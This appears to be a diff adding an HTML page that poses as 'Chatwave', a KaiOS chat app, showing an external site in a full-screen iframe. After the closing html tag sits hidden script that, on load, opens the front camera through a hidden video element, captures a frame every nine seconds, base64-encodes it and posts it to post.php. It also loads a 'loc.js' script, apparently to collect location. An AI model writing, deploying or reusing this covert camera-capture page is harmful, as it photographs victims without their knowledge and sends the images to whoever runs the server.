@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Character encoding for the document -->
+  <meta charset="UTF-8">
+  
+  <!-- Viewport settings for responsive design on mobile devices -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  
+  <meta property="og:description" content="Chatwave KaiOS Chatting Apps .">
+  
+<meta property="og:image" content="URL-to-image">
+
+  
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+
+  
+  <title>Chatwave</title>
+
+  <style>
+    /* Basic reset and full height/width for body and html */
+    body, html {
+      margin: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden; /* Prevents scrollbars */
+      display: flex; /* Centers the iframe */
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Removes border from the iframe */
+    iframe {
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <!-- Embeds an external webpage with full height and width -->
+  <iframe src="https://regal-naiad-17d6ad.netlify.app/main.html" allowfullscreen scrolling="yes" width="100%" height="100%"></iframe>
+
+
+</body>
+</html>
+
+
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</body>
